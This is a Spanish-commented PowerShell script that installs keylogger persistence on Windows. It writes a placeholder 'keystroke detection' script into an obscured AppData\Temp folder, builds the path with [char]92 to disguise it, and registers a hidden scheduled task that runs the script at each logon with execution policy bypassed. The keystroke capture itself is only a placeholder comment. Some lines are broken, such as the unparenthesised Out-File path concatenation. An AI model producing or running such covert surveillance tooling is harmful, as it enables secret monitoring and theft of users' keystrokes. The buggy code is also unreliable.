# Ruta predeterminada donde se guardará el script
$ScriptDirectory = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data"

# Crear el directorio si no existe
if (-not (Test-Path -Path $ScriptDirectory -PathType Container)) {
    New-Item -Path $ScriptDirectory -ItemType Directory
}

# Guardar el script de detección de pulsaciones de teclas en la ruta predeterminada
$ScriptPath = Join-Path -Path $ScriptDirectory -ChildPath "keystroke_script.ps1"
@"
# Aquí va tu script de detección de pulsaciones de teclas
"@ | Set-Content -Path $ScriptPath

# Crear un nuevo archivo XML con la definición de la tarea programada
$TaskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-02-09T00:00:00</Date>
    <Author>Usuario</Author>
    <Description>Ejecutar script de detección de pulsaciones de teclas al iniciar sesión en Windows.</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NoProfile -ExecutionPolicy Bypass -File "$ScriptPath"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

# Registrar la tarea programada elevada
$TaskXml | Out-File -FilePath "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data\KeystrokeDetection.xml"
$TaskPath = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data\KeystrokeDetection.xml"
$TaskName = "KeystrokeDetection"
$TaskService = New-Object -ComObject "Schedule.Service"
$TaskService.Connect()
$TaskFolder = $TaskService.GetFolder("\")
$TaskDefinition = $TaskService.NewTask(0)
$TaskDefinition.XmlText = (Get-Content -Path $TaskPath)
$TaskFolder.RegisterTaskDefinition($TaskName, $TaskDefinition, 6, $null, $null, 3)

# Ejecutar la tarea programada
$TaskService.GetFolder("\").GetTask($TaskName).Run($null)
